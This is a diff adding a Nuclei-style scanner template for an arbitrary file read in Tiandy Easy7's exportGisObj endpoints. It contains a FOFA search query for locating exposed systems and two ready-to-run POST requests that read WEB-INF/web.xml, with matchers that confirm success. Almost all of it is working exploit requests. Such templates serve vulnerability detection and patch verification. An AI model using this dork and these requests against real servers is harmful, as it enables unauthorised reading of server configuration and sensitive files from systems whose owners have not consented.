@@ -1,0 +1,51 @@
+id: TianDiWeiYe-Easy7-exportGisObj-File-Reading
+
+info:
+  name: 天地伟业 Easy7 exportGisObj 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
+    天地伟业 Easy7 的 /Easy7/rest/gis/exportGisObj 和 /Easy7/rest/gisCore/exportGisObj 接口存在任意文件读取漏洞，攻击者可通过构造恶意请求读取服务器敏感文件，导致敏感信息泄露。
+  reference:
+    - 
+  tags: file-reading, tiandy, easy7, arbitrary-file-read
+
+http:
+  # 第一个请求：检测 /Easy7/rest/gis/exportGisObj 接口
+  - raw:
+      - |-
+        POST /Easy7/rest/gis/exportGisObj HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: keep-alive
+
+        fileName=WEB-INF/web.xml
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains_all(body,'配置过滤器','servlet-name','param-name')"
+        condition: and
+        name: gis-exportGisObj-file-read接口
+
+  # 第二个请求：检测 /Easy7/rest/gisCore/exportGisObj 接口
+  - raw:
+      - |-
+        POST /Easy7/rest/gisCore/exportGisObj HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: keep-alive
+
+        fileName=WEB-INF/web.xml
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains_all(body,'配置过滤器','servlet-name','param-name')"
+        condition: and
+        name: gisCore-exportGisObj-file-read接口
